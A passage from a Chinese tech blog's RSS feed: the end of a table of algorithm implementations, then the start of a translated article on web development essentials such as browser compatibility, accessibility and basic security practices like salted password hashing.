<td>11‑17‑2010</td>
<td>C++</td>
<td>A set of functions to decompose a sequence of values into a sum of <a href="https://en.wikipedia.org/wiki/Haar_wavelet">Haar wavelets</a>.</td>
</tr>
<tr>
<td>Argmax</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=argmax">(link)</a></td>
<td>11‑19‑2010</td>
<td>C++</td>
<td>A pair of functions to compute the <a href="https://en.wikipedia.org/wiki/Arg_max">arg min or max</a> of a function on some range.</td>
</tr>
<tr>
<td>Derivative</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=derivative">(link)</a></td>
<td>11‑19‑2010</td>
<td>C++</td>
<td>A <a href="https://en.wikipedia.org/wiki/Function_object">function object</a> that approximates the <a href="https://en.wikipedia.org/wiki/Derivative">derivative</a> of a function.</td>
</tr>
<tr>
<td>Levenshtein Distance</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=levenshtein">(link)</a></td>
<td>11‑19‑2010</td>
<td>C++</td>
<td>An algorithm for computing the <a href="https://en.wikipedia.org/wiki/Levenshtein_distance">Levenshtein distance</a> between two sequences.</td>
</tr>
<tr>
<td>Skiplist</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=skiplist">(link)</a></td>
<td>11‑20‑2010</td>
<td>C++</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Skip_list">skip list</a>, a randomized data structure for maintaining a sorted collection.</td>
</tr>
<tr>
<td>van Emde Boas Tree</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=van-emde-boas-tree">(link)</a></td>
<td>11‑26‑2010</td>
<td>C++</td>
<td>An implementation of a sorted associative array backed by a <a href="https://en.wikipedia.org/wiki/Van_Emde_Boas_tree">van Emde Boas tree</a>.</td>
</tr>
<tr>
<td>Cuckoo HashMap</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=cuckoo-hashmap">(link)</a></td>
<td>11‑27‑2010</td>
<td>Java</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Hash_table">hash table</a> using <a href="https://en.wikipedia.org/wiki/Cuckoo_hashing">cuckoo hashing</a>.</td>
</tr>
<tr>
<td>Needleman-Wunsch Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=needleman-wunsch">(link)</a></td>
<td>11‑28‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm">Needleman-Wunsch</a> algorithm for optimal string alignment.</td>
</tr>
<tr>
<td>Treap</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=treap">(link)</a></td>
<td>11‑28‑2010</td>
<td>C++</td>
<td>An implementation of a sorted associative array backed by a <a href="https://en.wikipedia.org/wiki/Treap">treap</a>.</td>
</tr>
<tr>
<td>Floyd-Warshall Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=floyd-warshall">(link)</a></td>
<td>12‑10‑2010</td>
<td>Java</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Floyd-Warshall_algorithm">Floyd-Warshall algorithm</a> for all-pairs shortest paths in a graph.</td>
</tr>
<tr>
<td>Power Iteration</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=power-iteration">(link)</a></td>
<td>12‑10‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Power_iteration">power iteration</a> algorithm for finding dominant eigenvectors.</td>
</tr>
<tr>
<td>Edmonds’s Matching Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=edmonds-matching">(link)</a></td>
<td>12‑15‑2010</td>
<td>Java</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Edmonds's_matching_algorithm">Edmonds’s matching algorithm</a> for finding <a href="https://en.wikipedia.org/wiki/Matching_(graph_theory)#Maximum_matchings">maximum matchings</a> in undirected graphs.</td>
</tr>
<tr>
<td>Kosaraju’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=kosaraju">(link)</a></td>
<td>12‑15‑2010</td>
<td>Java</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Kosaraju's_algorithm">Kosaraju’s algorithm</a> algorithm for finding <a href="https://en.wikipedia.org/wiki/Strongly_connected_component">strongly connected components</a> of a directed graph.</td>
</tr>
<tr>
<td>2-SAT</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=2sat">(link)</a></td>
<td>12‑15‑2010</td>
<td>Java</td>
<td>A linear-time algorithm for solving <a href="https://en.wikipedia.org/wiki/2-satisfiability">2-SAT</a>.</td>
</tr>
<tr>
<td>Bellman-Ford Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=bellman-ford">(link)</a></td>
<td>12‑17‑2010</td>
<td>Java</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Bellman%E2%80%93Ford_algorithm">Bellman-Ford</a> algorithm for single-source shortest paths.</td>
</tr>
<tr>
<td>Topological Sort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=topological-sort">(link)</a></td>
<td>12‑17‑2010</td>
<td>Java</td>
<td>An algorithm for computing a <a href="https://en.wikipedia.org/wiki/Topological_sorting">topological sort</a> of a directed acyclic graph.</td>
</tr>
<tr>
<td>Graham Scan</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=graham-scan">(link)</a></td>
<td>12‑19‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Graham_scan">Graham scan</a> for finding convex hulls in 2D space.</td>
</tr>
<tr>
<td>Bipartite Testing</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=bipartite-verify">(link)</a></td>
<td>12‑19‑2010</td>
<td>Java</td>
<td>A linear-time algorithm for checking whether a directed graph is <a href="https://en.wikipedia.org/wiki/Bipartite_graph">bipartite</a>.</td>
</tr>
<tr>
<td>Johnson’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=johnson">(link)</a></td>
<td>12‑19‑2010</td>
<td>Java</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Johnson's_algorithm">Johnson’s algorithm</a> for all-pairs shortest paths.</td>
</tr>
<tr>
<td>Strassen Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=strassen">(link)</a></td>
<td>12‑20‑2010</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Strassen_algorithm">Strassen algorithm</a> for fast matrix multiplication.</td>
</tr>
<tr>
<td>Cartesian Tree Sort</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=cartesian-tree-sort">(link)</a></td>
<td>12‑21‑2010</td>
<td>C++</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Cartesian_tree#Application_in_sorting">Cartesian tree sort</a>, an adaptive, out-of-place heapsort variant.</td>
</tr>
<tr>
<td>Ford-Fulkerson Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=ford-fulkerson">(link)</a></td>
<td>12‑21‑2010</td>
<td>Java</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Ford%E2%80%93Fulkerson_algorithm">Ford-Fulkerson</a> maximum-flow algorithm.</td>
</tr>
<tr>
<td>Scaling Ford-Fulkerson</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=ford-fulkerson-scaling">(link)</a></td>
<td>12‑22‑2010</td>
<td>Java</td>
<td>An modification of the <a href="https://en.wikipedia.org/wiki/Ford%E2%80%93Fulkerson_algorithm">Ford-Fulkerson</a> maximum-flow algorithm that uses scaling to achieve polynomial time..</td>
</tr>
<tr>
<td>Splay Tree</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=splay-tree">(link)</a></td>
<td>12‑27‑2010</td>
<td>C++</td>
<td>An implementation of a sorted associative array backed by a <a href="https://en.wikipedia.org/wiki/Splay_tree">splay tree</a>.</td>
</tr>
<tr>
<td>Ternary Search Tree</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=ternary-search-tree">(link)</a></td>
<td>12‑28‑2010</td>
<td>C++</td>
<td>An implementation of a sorted set of strings backed by a <a href="https://en.wikipedia.org/wiki/Ternary_search_tree">ternary search tree</a>.</td>
</tr>
<tr>
<td>Ring Buffer</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=ring-buffer">(link)</a></td>
<td>12‑30‑2010</td>
<td>Java</td>
<td>An implementation of a FIFO queue using a <a href="https://en.wikipedia.org/wiki/Circular_buffer">ring buffer</a>.</td>
</tr>
<tr>
<td>AVL Tree</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=avl-tree">(link)</a></td>
<td>12‑30‑2010</td>
<td>C++</td>
<td>A sorted associative container backed by an <a href="https://en.wikipedia.org/wiki/AVL_tree">AVL tree</a>.</td>
</tr>
<tr>
<td>Rabin-Karp Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=rabin-karp">(link)</a></td>
<td>1‑1‑2011</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Rabin%E2%80%93Karp_string_search_algorithm">Rabin-Karp algorithm</a> for string matching.</td>
</tr>
<tr>
<td>RPN Evaluator</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=rpn-evaluate">(link)</a></td>
<td>1‑18‑2011</td>
<td>C++ / strain</td>
<td>A library to tokenize and evaluate simple arithmetic expressions in <a href="https://en.wikipedia.org/wiki/Reverse_Polish_notation">reverse Polish notation</a>.</td>
</tr>
<tr>
<td>Shunting-Yard Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=shunting-yard">(link)</a></td>
<td>1‑18‑2011</td>
<td>C++ / strain</td>
<td>An implementation of Dijkstra’s <a href="https://en.wikipedia.org/wiki/Shunting-yard_algorithm">shunting-yard algorithm</a> for converting infix expressions to reverse-Polish notation.</td>
</tr>
<tr>
<td>Skew Binomial Heap</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=skew-binomial-heap">(link)</a></td>
<td>1‑20‑2011</td>
<td>C++</td>
<td>An implementation of a priority queue backed by a <a href="https://en.wikipedia.org/wiki/Skew_binomial_heap">skew binomial heap</a>.</td>
</tr>
<tr>
<td>2/3 Heap</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=two-three-heap">(link)</a></td>
<td>3‑1‑2011</td>
<td>C++</td>
<td>An implementation of a priority queue whose branching factor alternates at different levels to maximize performance.</td>
</tr>
<tr>
<td>Zeckendorf Logarithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=zeckendorf-logarithm">(link)</a></td>
<td>3‑10‑2011</td>
<td>C++</td>
<td>An algorithm based on <a href="https://en.wikipedia.org/wiki/Zeckendorf's_theorem">Zeckendorf representations</a> that efficiently computes logarithms.</td>
</tr>
<tr>
<td>Factoradic Permutations</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=factoradic-permutation">(link)</a></td>
<td>3‑17‑2011</td>
<td>C++</td>
<td>A set of algorithms for generating <a href="https://en.wikipedia.org/wiki/Permutation">permutations</a> using the <a href="https://en.wikipedia.org/wiki/Factorial_number_system">factoradic number system</a>.</td>
</tr>
<tr>
<td>Binary Cyclic Subsets</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=binary-subset">(link)</a></td>
<td>3‑20‑2011</td>
<td>C++</td>
<td>A set of algorithms for generating <a href="https://en.wikipedia.org/wiki/Subset">subsets</a> in <a href="https://en.wikipedia.org/wiki/Lexicographical_order">lexicographical order</a> using <a href="http://www.keithschwarz.com/binary-subsets">binary numbers and cyclic shifts</a>.</td>
</tr>
<tr>
<td>Fibonacci Iterator</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=fibonacci-iterator">(link)</a></td>
<td>3‑22‑2011</td>
<td>C++</td>
<td>An STL-style iterator for iterating over the <a href="https://en.wikipedia.org/wiki/Fibonacci_number">Fibonacci numbers</a>.</td>
</tr>
<tr>
<td>Fibonacci Search</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=fibonacci-search">(link)</a></td>
<td>3‑22‑2011</td>
<td>C++</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Fibonacci_search_technique">Fibonacci search</a> algorithm.</td>
</tr>
<tr>
<td>Euclid’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=euclid">(link)</a></td>
<td>4‑18‑2011</td>
<td>Haskell</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Euclidean_algorithm">Euclid’s algorithm</a> and applications to <a href="https://en.wikipedia.org/wiki/Continued_fraction">continued fractions</a> and <a href="https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm">the extended Euclidean algorithm</a>.</td>
</tr>
<tr>
<td>Find Duplicate</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=find-duplicate">(link)</a></td>
<td>4‑18‑2011</td>
<td>Python</td>
<td>An algorithm to find a repeated element in an array using <a href="https://en.wikipedia.org/wiki/Cycle_detection#Tortoise_and_hare">Floyd’s cycle-finding algorithm</a>.</td>
</tr>
<tr>
<td>Permutation Generator</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=permutation-generator">(link)</a></td>
<td>4‑19‑2011</td>
<td>Python</td>
<td>A <a href="https://en.wikipedia.org/wiki/Generator_(computer_programming)">generator</a> for producing all <a href="https://en.wikipedia.org/wiki/Permutation">permutations</a> of a list of elements.</td>
</tr>
<tr>
<td>Matrix Find</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=matrix-find">(link)</a></td>
<td>4‑19‑2011</td>
<td>Python</td>
<td>A solution to the classic interview question of searching a sorted matrix for a particular value.</td>
</tr>
<tr>
<td>Binary GCD</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=binary-gcd">(link)</a></td>
<td>4‑23‑2011</td>
<td>Scheme</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Binary_GCD_algorithm">binary GCD algorithm</a> for computing greatest common divisors of nonnegative integers.</td>
</tr>
<tr>
<td>Knuth-Morris-Pratt Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=knuth-morris-pratt">(link)</a></td>
<td>5‑3‑2011</td>
<td>Python</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm">Knuth-Morris-Pratt algorithm</a> for fast string matching.</td>
</tr>
<tr>
<td>Kadane’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=kadane">(link)</a></td>
<td>5‑7‑2011</td>
<td>C++</td>
<td>An implementation of Kadane’s algorithm for solving the <a href="https://en.wikipedia.org/wiki/Maximum_subarray_problem">maximum-weight subarray problem</a>.</td>
</tr>
<tr>
<td>Karatsuba’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=karatsuba">(link)</a></td>
<td>8‑15‑2011</td>
<td>Python</td>
<td>An implementation of <a href="https://en.wikipedia.org/wiki/Karatsuba_algorithm">Karatsuba’s algorithm</a> for fast integer multiplication.</td>
</tr>
<tr>
<td>Min-Stack</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=min-stack">(link)</a></td>
<td>8‑15‑2011</td>
<td>C++</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Stack_(data_structure)">LIFO stack</a> that supports O(1) push, pop, and find-minimum.</td>
</tr>
<tr>
<td>Random Bag</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=random-bag">(link)</a></td>
<td>8‑15‑2011</td>
<td>Python</td>
<td>A data structure that supports insertion and removal of a uniformly-random element.</td>
</tr>
<tr>
<td>Min-Queue</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=min-queue">(link)</a></td>
<td>8‑15‑2011</td>
<td>C++</td>
<td>An implementation of a <a href="https://en.wikipedia.org/wiki/Queue_(data_structure)">FIFO queue</a> that supports O(1) push, pop, and find-minimum.</td>
</tr>
<tr>
<td>Lights-Out Solver</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=lights-out">(link)</a></td>
<td>8‑29‑2011</td>
<td>C++</td>
<td>A solver for the game <a href="https://en.wikipedia.org/wiki/Lights_Out_(game)">Lights Out</a> using <a href="https://en.wikipedia.org/wiki/Gaussian_elimination">Gaussian elimination</a> over <a href="https://en.wikipedia.org/wiki/GF(2)">GF(2)</a>.</td>
</tr>
<tr>
<td>Maximum Single-Sell Profit</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=single-sell-profit">(link)</a></td>
<td>11‑9‑2011</td>
<td>Python</td>
<td>Four algorithms for the <a href="https://stackoverflow.com/q/7086464/501557">maximum single-sell profit problem</a>, each showing off a different algorithmic technique.</td>
</tr>
<tr>
<td>Generalized Kadane’s Algorithm</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=generalized-kadane">(link)</a></td>
<td>11‑10‑2011</td>
<td>C++</td>
<td>A generalization of <a href="https://en.wikipedia.org/wiki/Maximum_subarray_problem">Kadane’s algorithm</a> for solving the maximum subarray problem subject to a <a href="https://stackoverflow.com/q/7861387/501557">length restriction</a>.</td>
</tr>
<tr>
<td>Longest Range</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=longest-range">(link)</a></td>
<td>11‑19‑2011</td>
<td>Java</td>
<td>An algorithm for solving the <a href="https://stackoverflow.com/q/5415305/501557">longest contiguous range</a> problem.</td>
</tr>
<tr>
<td>Egyptian Fractions</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=egyptian-fraction">(link)</a></td>
<td>11‑20‑2011</td>
<td>Python</td>
<td>An implementation of the <a href="https://en.wikipedia.org/wiki/Greedy_algorithm_for_Egyptian_fractions">greedy algorithm</a> for finding <a href="https://en.wikipedia.org/wiki/Egyptian_fraction">Egyptian fractions</a>.</td>
</tr>
<tr>
<td>LL(1) Parser Generator</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=ll1">(link)</a></td>
<td>11‑21‑2011</td>
<td>Java</td>
<td>An <a href="https://en.wikipedia.org/wiki/LL_parser">LL(1) parser generator</a>.</td>
</tr>
<tr>
<td>LR(0) Parser Generator</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=lr0">(link)</a></td>
<td>11‑23‑2011</td>
<td>Java</td>
<td>An <a href="https://en.wikipedia.org/wiki/LR_parser">LR(0) parser generator</a>.</td>
</tr>
<tr>
<td>Word Ladders</td>
<td><a href="http://www.keithschwarz.com/interesting/code/?dir=word-ladder">(link)</a></td>
<td>11‑27‑2011</td>
<td>JavaScript</td>
<td>A program for finding <a href="https://en.wikipedia.org/wiki/Word_ladder">word ladders</a> between two words.</td>
</tr>
</tbody>
</table>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-11-29T11:11:07+08:00</pubDate>
<guid>https://coolshell.cn/articles/6010.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Web开发中需要了解的东西 ]]></title>
<link>https://coolshell.cn/articles/6043.html</link>
<content><![CDATA[ 
<p>在StackExchange上有人问了这样一个问题：<a href="https://programmers.stackexchange.com/questions/46716/what-should-every-programmer-know-about-web-development" target="_blank">What should every programmer know about web development?</a>（关于Web开发，什么是所有程序员需要知道的？）里面给出的答案非常不错，所以，我翻译转载过来。 顺便说一下，StackExchange真是非常好，大家可以对同一个答案做贡献和修订，看看这个问题的<a href="https://programmers.stackexchange.com/posts/46760/revisions" target="_blank">修订过程</a>你就知道了——专业的问答网站应该怎么去做。这就是我在这篇文章中也说过<a title="腾讯，竞争力 和 用户体验" href="https://coolshell.cn/articles/5901.html" target="_blank">真正的用户体验是什么样的</a>。</p>
<p>好了，下面是正文（我对原文做了一些批注，也许不对或有误导，请大家指正）</p>
<p>下面的这些东西可能对于大多数人并不陌生，但是可能会有些东西你以前并没有看过，或是没有完全搞懂，甚至都没有听说过。（陈皓注：我相信当你看完这个列表后，你会觉得对于我国的Web开发有点弱了，还是那句话，表面上的东西永远是肤浅的）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%8E%A5%E5%8F%A3%E5%92%8C%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C" title="接口和用户体验">接口和用户体验</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%AE%89%E5%85%A8" title="安全">安全</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%80%A7%E8%83%BD" title="性能">性能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#SEO_%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BC%98%E5%8C%96" title="SEO (搜索引擎优化)">SEO (搜索引擎优化)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%8A%80%E6%9C%AF" title="技术">技术</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Bug_fixing" title="Bug fixing">Bug fixing</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%8E%A5%E5%8F%A3%E5%92%8C%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C"></span><strong>接口和用户体验</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>小心浏览器的实现标准上的不一致，确信让你的网站能够适当地跨浏览器。至少，你的网站需要测试一下下面的浏览器：</li>
<ul>
<li>最新的 <a href="https://en.wikipedia.org/wiki/Gecko_%28layout_engine%29" rel="nofollow">Gecko</a> 引擎 (<a href="https://firefox.com/" rel="nofollow">Firefox</a>)，</li>
<li>一个 Webkit 引擎 (<a href="https://www.apple.com/safari/" rel="nofollow">Safari</a>, <a href="https://www.google.com/chrome" rel="nofollow">Chrome</a>, 或是其它的移动设备上的浏览器)</li>
<li> <a href="https://en.wikipedia.org/wiki/Internet_Explorer" rel="nofollow">IE 浏览器</a> (测试IE的兼容性你可以使用微软IE的 <a href="https://www.microsoft.com/Downloads/details.aspx?FamilyID=21eabb90-958f-4b64-b5f1-73d0a413c8ef&amp;displaylang=en" rel="nofollow">Application Compatibility VPC Images</a>)</li>
<li> <a href="https://www.opera.com/" rel="nofollow">Opera</a> 浏览器。</li>
</ul>
</ul>
<p style="padding-left: 30px;">最后，你可以使用一下<a href="http://www.browsershots.org/" rel="nofollow">这个工具</a> 来看看你的网页在不同的浏览器下是怎么被显示出来的（陈皓注：这个工具就是以前本站介绍过的<a title="如何检查网页浏览器的兼容性" href="https://coolshell.cn/articles/757.html" target="_blank">在不同浏览器和平台上检查你的网站的兼容性</a>）</p>
<ul>
<li>多考虑一下人们是怎么来访问你的网站而不是那些主流的浏览器：手机，读屏软件和搜索引擎，例如：一些Accessibility的东西： <a href="https://www.w3.org/WAI/" rel="nofollow">WAI</a> 和  <a href="https://www.section508.gov/" rel="nofollow">Section508</a>, 移动设备开发：<a href="http://mobiforge.com/" rel="nofollow">MobiForge</a>.</li>
</ul>
<ul>
<li>部署Staging：怎么部署网站的更新而不会影响用户的访问。 <a href="https://programmers.stackexchange.com/questions/46716/what-should-a-developer-know-before-building-a-public-web-site/46738#46738">Ed Lucas的答案</a> 可以让你了解一些（陈皓注：Ed说了一些如版本控制，自动化build，备份，回滚等机制）。</li>
</ul>
<ul>
<li>千万不要直接给用户显示不友好的错误信息。</li>
</ul>
<div><span id="more-6043"></span></div>
<ul>
<li>千万不要把用户的邮件地址以明文显示出来，这样会被爬虫爬走并被让用户的邮箱被垃圾邮件搞死。</li>
</ul>
<ul>
<li>为用户的链接加上 <code>rel="nofollow"</code> 的属性以 <a href="https://en.wikipedia.org/wiki/Nofollow" rel="nofollow">避免垃圾网站的干扰</a>。（陈皓注：<strong>nofollow</strong>是HTML的一个属性，用于通知搜索引擎“这个链接所指向的网页非我所能控制，对其内容不予置评”，或者简单地说，该链接不是对目标网站或网页的“投票”，这样搜索引擎不会再访问这个链接。这个是用来减少一些特定垃圾页面对原网站的影响，从而可以改善搜索结果的质量，并且防止垃圾链接的蔓延。）</li>
</ul>
<ul>
<li>
<a href="http://www.codinghorror.com/blog/archives/001228.html" rel="nofollow">为网站建立一些的限制</a> – 这个属于安全性的范畴。（陈皓注：比如你在Google注册邮箱时，你一口气注册超过两个以上的邮箱，gmail要求给你发短信或是给你打电话认证，比如Discuz论坛的会限制你发贴或是搜索的间隔时间等等，更多的网站会用CAPTCHA来确认是人为的操作。 这些限制都是为了防止垃圾和恶意攻击）</li>
</ul>
<ul>
<li>学习如何做 <a href="https://en.wikipedia.org/wiki/Progressive_enhancement" rel="nofollow">Progressive Enhancement</a>. （陈皓注：<a href="https://en.wikipedia.org/wiki/Progressive_enhancement" rel="nofollow">Progressive Enhancement</a>是一个Web Design的理念，如：1）基础的内容和功能应该可以被所有的浏览器存取，2）页面布局的应该使用外部的CSS链接，3）Javascript也应该是外部链接还应该是 <a title="Unobtrusive JavaScript" href="https://en.wikipedia.org/wiki/Unobtrusive_JavaScript">unobtrusive</a> 的，4）应该让用户可以设置他们的偏好）</li>
</ul>
<ul>
<li>如果POST成功，要<a href="https://en.wikipedia.org/wiki/Post/Redirect/Get" rel="nofollow">在POST方法后重定向网址</a>，这样可以阻止用户通过刷新页面重复提交。</li>
</ul>
<ul>
<li>严重关注Accessibility。因为这是<a href="https://www.section508.gov/" target="_blank">法律上的需求</a>（陈皓注：Section 508是美国的508法案，其是美国劳工复健法的改进，它是一部联邦法律，这个法律要求所有技术要考虑到残障人士的应用，如果某个大众信息传播网站，如果某些用户群体（如残疾人）浏览该网站获取信息时，如果他们无法正常获得所期望的信息（如无法正常浏览），那可以依据相关法规，可以对该网站依法起诉）。 <a href="https://www.w3.org/WAI/intro/aria" rel="nofollow">WAI-ARIA</a> 为这方面的事提供很不错的资源.</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%AE%89%E5%85%A8"></span><strong>安全</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>在网上有很多关于安全的文章，但是 <a href="https://www.owasp.org/index.php/Category%3aOWASP_Guide_Project" rel="nofollow">OWASP 开发指导</a> 涵盖了几乎所有关于Web站点安全的东西。（陈皓注：OWASP(开放Web应用安全项目- Open Web Application Security Project)是一个开放的非营利性组织，目前全球有130个分会近万名会员，其主要目标是研议协助解决Web软体安全之标准、工具与技术文件，长期 致力于协助政府或企业了解并改善网页应用程式与网页服务的安全性。OWASP被视为Web应用安全领域的权威参考。2009年下列发布的美国国家和国际立法、标准、准则、委员会和行业实务守则参考引用了OWASP。美国联邦贸易委员会(FTC)强烈建议所有企业需遵循OWASP十大WEB弱点防护守则）</li>
</ul>
<ul>
<li>了解什么是 <a href="https://en.wikipedia.org/wiki/SQL_injection" rel="nofollow">SQL 注入攻击</a> 并知道怎么阻止这种攻击。</li>
</ul>
<ul>
<li>永远不要相信用户的输入（包括Cookies，因为那也是用户的输入）</li>
</ul>
<ul>
<li>对用户的口令进行Hash，并使用salt，以防止Rainbow 攻击（陈皓注：Hash算法可用MD5或SHA1等，对口令使用salt的意思是，user 在设定密码时，system 产生另外一个random string(salt)。在datbase 存的​​是与salt + passwd 产的md5sum 及salt。 当要验证密码时就把user 输入的string 加上使用者的salt，产生md5s​​um 来比对。 理论上用salt 可以大幅度让密码更难破解，相同的密码除非刚好salt 相同，最后​​存在database 上的内容是不一样的。google一下md5+salt你可以看到很多文章。关于<a href="https://en.wikipedia.org/wiki/Rainbow_table" target="_blank">Rainbow 攻击</a>，其意思是很像密码字典表，但不同的是，Rainbow Table存的是已经被Hash过的密码了，而且其查找密码的速度更快，这样可以让攻击非常快）。使用慢一点的Hash算法来保存口令，如 bcrypt (被时间检证过了) 或是 scrypt (更强，但是也更新一些) (<a href="https://www.tarsnap.com/scrypt.html" rel="nofollow">1</a>, <a href="https://it.slashdot.org/comments.pl?sid=1987632&amp;cid=35149842" rel="nofollow">2</a>)。你可以阅读一下 <a href="http://codahale.com/how-to-safely-store-a-password/" rel="nofollow">How To Safely Store A Password</a>（陈皓注：酷壳以前曾介绍过<a title="如何防范密码被破解" href="https://coolshell.cn/articles/2078.html" target="_blank">bcrypt这个算法</a>，这里，我更建议我们应该让用户输入比较强的口令，比如Apple ID注册的过程需要用户输入超过8位，需要有大小写和数字的口令，或是做出类似于<a title="另类UX让你输入强口令" href="https://coolshell.cn/articles/3877.html" target="_blank">这样的用户体验的东西</a>）。</li>
</ul>
<ul>
<li>
<a href="https://stackoverflow.com/questions/1581610/how-can-i-store-my-users-passwords-safely/1581919#1581919">不要试图自己去发明或创造一个自己的fancy的认证系统</a>，你可能会忽略到一些不容易让你查觉的东西而导致你的站点被hack了。（陈皓注：我在<a title="如何设计“找回用户帐号”功能" href="https://coolshell.cn/articles/5987.html" target="_blank">腾讯那坑爹的申诉系统</a>中说过这个事了，我说过这句话——“真正的安全系统是协同整个社会的安全系统做出来的一道安全长城，而不是什么都要自己搞”，当然，很遗憾不是所有的人都能看懂这个事，包括一些资深的人）</li>
</ul>
<ul>
